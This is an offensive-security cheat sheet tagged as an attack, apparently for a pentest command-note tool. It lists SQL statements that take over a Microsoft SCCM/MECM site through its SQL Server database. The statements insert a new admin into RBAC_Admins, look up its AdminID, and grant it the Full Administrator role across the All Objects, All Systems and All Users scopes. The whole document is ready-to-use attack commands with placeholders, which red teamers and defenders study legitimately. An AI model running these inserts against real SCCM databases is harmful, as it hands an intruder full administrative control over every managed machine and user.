# sccm-mssql-cmd 

% sccm, mecm, mssql, Microsoft SQL Server, 1433
#plateform/linux  #target/remote  #protocol/sql  #port/1433 #cat/ATTACK

#plateform/linux  #target/remote #cat/ATTACK/RELAY

## create an admin account
```sql
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES
(<SID_in_hex_format>,'<domain_fqdn\user>',0,0,'','','','','<sccm_site_code>');
```

## get AdminID
```sql
SELECT AdminID,LogonName FROM RBAC_Admins;
```

## create permission (1)
Full Administrator role for the "All Objects" scope
```sql
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<sccm_admin_id>,'SMS0001R','SMS00ALL','29');
```

## create permission (2)
Full Administrator role for the "All Systems" scope
```sql
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<sccm_admin_id>,'SMS0001R','SMS00001','1');
```

## create permission (3)
Full Administrator role for the "All Users and User Groups" scope
```sql
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<sccm_admin_id>,'SMS0001R','SMS00004','1');
```